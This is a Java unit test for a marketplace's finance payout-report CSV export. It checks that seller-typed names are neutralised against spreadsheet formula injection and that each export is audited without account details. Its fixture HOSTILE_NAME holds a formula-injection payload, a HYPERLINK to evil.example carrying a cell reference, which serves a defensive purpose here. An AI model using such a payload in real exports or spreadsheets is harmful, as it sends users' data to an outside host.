package com.innbucks.marketplaceservice.settlement;

import com.innbucks.marketplaceservice.audit.AuditEventType;
import com.innbucks.marketplaceservice.audit.AuditService;
import com.innbucks.marketplaceservice.config.MarketZone;
import com.innbucks.marketplaceservice.security.AuthenticatedUser;
import com.innbucks.marketplaceservice.seller.MarketplaceSeller;
import com.innbucks.marketplaceservice.seller.PayoutMethod;
import com.innbucks.marketplaceservice.seller.SellerService;
import com.innbucks.marketplaceservice.settlement.MerchantSettlementRepository.PayoutRow;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.mockito.ArgumentCaptor;

import java.time.Instant;
import java.time.LocalDate;
import java.time.ZoneOffset;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.UUID;

import static org.assertj.core.api.Assertions.assertThat;
import static org.mockito.ArgumentMatchers.anyList;
import static org.mockito.ArgumentMatchers.anyMap;
import static org.mockito.ArgumentMatchers.eq;
import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.verify;
import static org.mockito.Mockito.when;

/**
 * The finance payout report: seller-typed text reaches the sheet only as
 * text, and every export leaves one audit row that sizes it without naming
 * a single account.
 */
class PayoutReportCsvTest {

    private static final UUID BANK_SELLER = UUID.fromString("7e2a9c41-5b8f-4d36-a1c9-8f3b6d2e7a54");
    private static final UUID WALLET_SELLER = UUID.fromString("3b1f6e02-9c4d-4a7e-8f21-5d0c9a7b3e16");
    private static final UUID NO_DESTINATION = UUID.fromString("9d4c2a71-0e6b-4f58-b3a2-7c1e8f5d6a90");
    private static final String HOSTILE_NAME = "=HYPERLINK(\"http://evil.example/?\"&A2,\"Click\")";

    private final MerchantSettlementRepository repository = mock(MerchantSettlementRepository.class);
    private final SellerService sellerService = mock(SellerService.class);
    private final AuditService auditService = mock(AuditService.class);
    private final AuthenticatedUser operator = new AuthenticatedUser(
            UUID.randomUUID().toString(), Set.of("SUPER_ADMIN"), null, null, null, "ZW", null);

    private SettlementQueryService service;

    @BeforeEach
    void setUp() {
        service = new SettlementQueryService(repository, mock(SettlementService.class),
                sellerService, mock(SettlementViewAssembler.class), mock(MarketZone.class),
                auditService);
        when(repository.payoutReport()).thenReturn(List.of(
                row(BANK_SELLER, 12, 185_000, "USD"),
                row(WALLET_SELLER, 3, 4_650, "USD"),
                row(NO_DESTINATION, 1, 1_550, "ZWG")));
        MarketplaceSeller bank = MarketplaceSeller.builder()
                .merchantId(BANK_SELLER)
                .payoutMethod(PayoutMethod.BANK)
                .payoutAccountName(HOSTILE_NAME)
                .payoutBankName("-CBZ, Bank")
                .payoutAccountNumber("01123456789012")
                .payoutUpdatedAt(Instant.parse("2026-09-02T08:14:03Z"))
                .build();
        MarketplaceSeller wallet = MarketplaceSeller.builder()
                .merchantId(WALLET_SELLER)
                .payoutMethod(PayoutMethod.MOBILE_MONEY)
                .payoutAccountName("Tariro Moyo")
                .payoutMsisdn("+263771234567")
                .payoutUpdatedAt(Instant.parse("2026-08-20T11:40:55Z"))
                .build();
        Map<UUID, MarketplaceSeller> sellers = Map.of(BANK_SELLER, bank, WALLET_SELLER, wallet);
        when(sellerService.findAllByMerchantIds(anyList())).thenReturn(sellers);
        when(sellerService.displayNames(anyList(), anyMap())).thenReturn(Map.of(
                BANK_SELLER, "@Sunrise Electronics", WALLET_SELLER, "Harare Home Goods"));
    }

    @Test
    @DisplayName("A seller's '=' account name, '-' bank name and '@' trading name arrive as TEXT")
    void sellerTextIsNeutralised() {
        String csv = service.payoutReportCsv(operator).content();
        List<String> lines = csv.lines().toList();

        assertThat(lines.get(1)).isEqualTo(BANK_SELLER + ",'@Sunrise Electronics,12,185000,USD,"
                + "BANK,\"'=HYPERLINK(\"\"http://evil.example/?\"\"&A2,\"\"Click\"\")\",,"
                + "\"'-CBZ, Bank\",01123456789012,2026-09-02T08:14:03Z");
        // The wallet's number keeps its plus behind the apostrophe; a
        // spreadsheet would otherwise read it as a number and drop it.
        assertThat(lines.get(2)).isEqualTo(WALLET_SELLER + ",Harare Home Goods,3,4650,USD,"
                + "MOBILE_MONEY,Tariro Moyo,'+263771234567,,,2026-08-20T11:40:55Z");
        // No destination: the row still appears, every destination column empty.
        assertThat(lines.get(3)).isEqualTo(NO_DESTINATION + ",,1,1550,ZWG,,,,,,");
        // No cell of the whole sheet starts with a raw formula trigger.
        for (String line : lines) {
            for (String cell : line.split(",")) {
                assertThat(cell).doesNotStartWith("=").doesNotStartWith("@")
                        .doesNotStartWith("\"=").doesNotStartWith("\"-");
            }
        }
    }

    @Test
    @DisplayName("Every export writes ONE audit row: counts and totals, never an account")
    @SuppressWarnings("unchecked")
    void everyExportIsAuditedWithoutAccountData() {
        SettlementQueryService.Csv csv = service.payoutReportCsv(operator);

        ArgumentCaptor<Map<String, Object>> metadata = ArgumentCaptor.forClass(Map.class);
        verify(auditService).record(eq(AuditEventType.PAYOUT_REPORT_EXPORTED),
                eq(operator.uuid()), eq(csv.filename()), metadata.capture());
        assertThat(csv.filename())
                .isEqualTo("marketplace-payout-report-" + LocalDate.now(ZoneOffset.UTC) + ".csv");
        assertThat(metadata.getValue())
                .containsEntry("rows", 3)
                .containsEntry("parcels", 16L)
                .containsEntry("netCentsByCurrency", Map.of("USD", 189_650L, "ZWG", 1_550L))
                .containsEntry("withoutDestination", 1)
                .containsKey("reportDate");
        String flattened = metadata.getValue().toString();
        assertThat(flattened).doesNotContain("01123456789012", "263771234567", "Tariro",
                "HYPERLINK", "CBZ", "Sunrise", BANK_SELLER.toString());
    }

    private static PayoutRow row(UUID merchantId, long parcels, long netCents, String currency) {
        return new PayoutRow() {
            @Override
            public UUID getMerchantId() {
                return merchantId;
            }

            @Override
            public long getParcels() {
                return parcels;
            }

            @Override
            public long getNetCents() {
                return netCents;
            }

            @Override
            public String getCurrency() {
                return currency;
            }
        };
    }
}
